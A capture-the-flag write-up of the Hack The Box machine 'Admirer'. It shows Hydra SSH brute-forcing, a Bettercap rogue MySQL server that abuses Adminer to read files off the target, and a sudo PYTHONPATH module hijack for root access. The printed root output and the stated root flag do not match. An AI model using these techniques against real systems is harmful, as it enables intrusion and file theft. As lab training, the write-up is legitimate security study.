---
layout: post
title: "[HTB] Admirer"
categories:
    - Hacking and Security
    - Offensive Security
    - Web Security
tags:
    - CTF
    - Hack The Box
---
Admirer is an easy [Hack The Box][htb] Linux-based machine released on the 2nd
of May 2020 and reachable on the IP address `10.10.10.187`.

For whose who don't know it yet, Hack The Box is an online platform where vulnerable
machines are deployed in a private network accessible via VPN, and where users
need to hack their way into the systems to collect flags as proofs of their success.

![HTB Admirer information card](/assets/images/htb-admirer-info-card.jpg)

<!--more-->

## User flag

Let's start with an Nmap scan:

```raw
$ nmap -A 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 09:39 EDT
Nmap scan report for 10.10.10.187
Host is up (0.033s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.72 seconds
```

The Nmap scan detected 3 TCP services:

* vsftpd on port 21
* OpenSSH on port 22
* Apache on port 80

The FTP service doesn't allow anonymous access, otherwise Nmap would have told
us about it (the Nmap script [`ftp-anon`][nmap-ftp-anon] is part of the "default"
group of scripts).

Regarding the website, Nmap extracted one hidden folder from `/robots.txt` named
`admin-dir` for which the following comment can be read in the same file:

> This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo

At this point, I initially tried to fuzz the `/admin-dir` folder with some
well-known security wordlists, but without any success. Then, I tried with a few
combinations of filenames around the concepts of "contacts" and "credentials",
and the result didn't take long to come. I found the two files the above comment
was referring to: `/admin-dir/contacts.txt` and `/admin-dir/credentials.txt`.

The first one contains a list of email addresses with the first name and role of
the persons as comments:

```raw
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

And the second one some credentials for different services:

```raw
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

With the FTP credentials, I could download these 2 files from vsftpd:

* `html.tar.gz`
* `dump.sql`

The SQL backup doesn't contain anything interesting but `html.tar.gz` reveals the
website structure:

```raw
$ tree html
html
├── assets
│   ├── css
│   │   ├── fontawesome-all.min.css
│   │   ├── images
│   │   │   ├── arrow.svg
│   │   │   ├── close.svg
│   │   │   └── spinner.svg
│   │   ├── main.css
│   │   └── noscript.css
│   ├── js
│   │   ├── breakpoints.min.js
│   │   ├── browser.min.js
│   │   ├── jquery.min.js
│   │   ├── jquery.poptrox.min.js
│   │   ├── main.js
│   │   └── util.js
│   ├── sass
│   │   ├── base
│   │   │   ├── _page.scss
│   │   │   ├── _reset.scss
│   │   │   └── _typography.scss
│   │   ├── components
│   │   │   ├── _actions.scss
│   │   │   ├── _button.scss
│   │   │   ├── _form.scss
│   │   │   ├── _icon.scss
│   │   │   ├── _icons.scss
│   │   │   ├── _list.scss
│   │   │   ├── _panel.scss
│   │   │   ├── _poptrox-popup.scss
│   │   │   └── _table.scss
│   │   ├── layout
│   │   │   ├── _footer.scss
│   │   │   ├── _header.scss
│   │   │   ├── _main.scss
│   │   │   └── _wrapper.scss
│   │   ├── libs
│   │   │   ├── _breakpoints.scss
│   │   │   ├── _functions.scss
│   │   │   ├── _mixins.scss
│   │   │   ├── _vars.scss
│   │   │   └── _vendor.scss
│   │   ├── main.scss
│   │   └── noscript.scss
│   └── webfonts
│       ├── fa-brands-400.eot
│       ├── fa-brands-400.svg
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.eot
│       ├── fa-regular-400.svg
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.eot
│       ├── fa-solid-900.svg
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff
│       └── fa-solid-900.woff2
├── images
│   ├── fulls
│   │   ├── arch01.jpg
│   │   ├── arch02.jpg
│   │   ├── art01.jpg
│   │   ├── art02.jpg
│   │   ├── eng01.jpg
│   │   ├── eng02.jpg
│   │   ├── mind01.jpg
│   │   ├── mind02.jpg
│   │   ├── mus01.jpg
│   │   ├── mus02.jpg
│   │   ├── nat01.jpg
│   │   └── nat02.jpg
│   └── thumbs
│       ├── thmb_arch01.jpg
│       ├── thmb_arch02.jpg
│       ├── thmb_art01.jpg
│       ├── thmb_art02.jpg
│       ├── thmb_eng01.jpg
│       ├── thmb_eng02.jpg
│       ├── thmb_mind01.jpg
│       ├── thmb_mind02.jpg
│       ├── thmb_mus01.jpg
│       ├── thmb_mus02.jpg
│       ├── thmb_nat01.jpg
│       └── thmb_nat02.jpg
├── index.php
├── robots.txt
├── utility-scripts
│   ├── admin_tasks.php
│   ├── db_admin.php
│   ├── info.php
│   └── phptest.php
└── w4ld0s_s3cr3t_d1r
    ├── contacts.txt
    └── credentials.txt

15 directories, 82 files
```

The structure of the backup is almost the same as the one of the live website.
Only `w4ld0s_s3cr3t_d1r` has a different name (`admin-dir` on the live website).

After inspection, I found a couple of credentials in different files. In
`index.php` (note the non-escaped double quotes in the password):

```php
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

In `utility-scripts/db_admin.php`:

```php
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

And in `w4ld0s_s3cr3t_d1r/credentials.txt` (the same file on the live website
doesn't contain the bank account):

```raw
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

With all these credentials, I made two wordlists. One with the different usernames:

```raw
waldo
waldo.11
admin
ftpuser
w.cooper@admirer.htb
p.wise@admirer.htb
r.nayyar@admirer.htb
a.bialik@admirer.htb
l.galecki@admirer.htb
h.helberg@admirer.htb
b.rauch@admirer.htb
w.cooper
p.wise
r.nayyar
a.bialik
l.galecki
h.helberg
b.rauch
```

And another one with the different passwords:

```raw
Wh3r3_1s_w4ld0?
]F7jLHw:*G>UPrTo}~A
]F7jLHw:*G>UPrTo}~A"d6b
Ezy]m27}OREc$
fgJr6q#S\W:$P
%n?4Wz}R$tTF7
w0rdpr3ss01!
```

Then, I tried to brute-force the SSH service with [Hydra][kali-hydra]:

```raw
$ hydra -L usernames.txt -P passwords.txt -t 4 10.10.10.187 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-18 06:22:59
[DATA] max 4 tasks per 1 server, overall 4 tasks, 126 login tries (l:18/p:7), ~32 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
[STATUS] 106.00 tries/min, 106 tries in 00:01h, 20 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-18 06:24:11
```

The FTP credentials worked but the connection is automatically closed before
accessing any shell. I also tried the same brute-forcing technique on the FTP
service but with no more luck.

I decided to have a closer look at the files in the backup, and I eventually
stumbled upon this comment in `utility-scripts/db_admin.php`:

> // TODO: Finish implementing this or find a better open source alternative

After a quick search on the internet for "phpmyadmin equivalents", I found a
tool called "Adminer". Bingo!

![HTB Admirer Adminer login page](/assets/images/htb-admirer-adminer-login.png)

The Adminer dashboard is accessible at
`http://10.10.10.187/utility-scripts/adminer.php`. I tried the different
credentials I had collected so far but nothing worked. Then, I checked the
known vulnerabilities of Adminer v4.6.2 (the version number is indicated on the
login page) and it turned out that
[there is a way to read arbitrary files on the remote machine][adminer-exploit-blog-post].

The attack takes place in 2 steps:

* Instead of trying to log in the local database of the remote system, an
attacker can log in a public RDBMS they own.
* Then, the attacker can execute `LOCAL INFILE` SQL queries to read arbitrary
files on the remote filesystem.

[Bettercap][bettercap] has a
[module to set up a rogue MySQL server][bettercap-mysql-module] to read files
from the victim using the technique previously mentioned. To do so, I created a
[caplet script][bettercap-caplets] with the following content:

```raw
# Replace with your HTB VPN IP address.
set mysql.server.address 10.10.14.17
set mysql.server.port 3306
# The file you want to read from the remote machine.
set mysql.server.infile ../index.php
mysql.server on
```

And to start Bettercap:

```raw
# bettercap -caplet adminer-mysql.cap
```

Before going further, make sure to accept incoming connections from the remote
server. If you are on a Linux-based system like myself, add this Netfilter rule
with `iptables`:

```raw
# iptables -I INPUT 1 -s 10.10.10.187 -j ACCEPT
```

To start the attack, I just needed to ask Adminer to connect to my rogue server
via the login form. Since I used a fake MySQL server, I could enter any username,
password and database name I wanted. It worked well and I could retrieve the
actual MySQL credentials used by the PHP application:

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
```

And these credentials are the ones of an actual UNIX account!

```raw
$ ssh waldo@10.10.10.187
waldo@10.10.10.187's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
19fd5ec7c90993b3fafd9e778cb221ca
```

## Root flag

After a bit of enumeration, I quickly realised that `waldo` had the permission
to run `/opt/scripts/admin_tasks.sh` on behalf of `root`:

```raw
$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

When running this shell script, the user is prompted to select an admin task to execute:

```raw
$ sudo /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option:
```

After inspection of the source code, the only promising element I found for a
privilege escalation was the call to the Python script `/opt/scripts/backup.py`
(belonging to `root` as well):

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

This backup tool imports the `make_archive` function from the `shutil` module
to generate a `gztar` archive of the `/var/www/html` folder:

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

In Python, the folders where the interpreter looks for the modules you try to
import are listed in the [`PYTHONPATH`][python-path] environment variable, just
like `PATH` in a shell. Given that the `SETENV` option is set in the `sudoers`
policy module for the execution of `/opt/scripts/admin_tasks.sh` by `waldo`, the
value of `PYTHONPATH` can be overwritten, allowing to inject custom versions of
the imported modules.

It is exactly the strategy I followed. I created another module named `shutil` containing
my own implementation of `make_archive`:

```python
def make_archive(x, y, z):
    with open('/root/root.txt', 'r') as f:
        print(f.readline())
```

I placed this Python script in `/tmp/shutil/__init__.py` and then:

```raw
$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
$ 86875a82845fa2c5f211500a85d78f5c


$
```

The root flag was `cf943b5f4a33dc4b9a438550d232915f`.

## Wrapping up

It was an easy machine, as expected. It still allowed me to discover the Adminer
project and it was also an occasion for me to use the rogue MySQL server of Bettercap.

 [adminer-exploit-blog-post]: https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f "Adminer Script Results to Pwning Server?, Private Bug Bounty Program"
 [bettercap]: https://www.bettercap.org/ "Bettercap Official Website"
 [bettercap-caplets]: https://www.bettercap.org/usage/#caplets "Bettercap - Caplets"
 [bettercap-mysql-module]: https://www.bettercap.org/modules/ethernet/servers/mysql.server/ "Bettercap MySQL module"
 [htb]: https://hackthebox.eu/ "Hack The Box - Main Website"
 [kali-hydra]: https://tools.kali.org/password-attacks/hydra "Kali Tools - Hydra Package Description"
 [nmap-ftp-anon]: https://nmap.org/nsedoc/scripts/ftp-anon.html "Nmap script ftp-anon"
 [python-path]: https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH "Python 3 Documentation - PYTHONPATH"
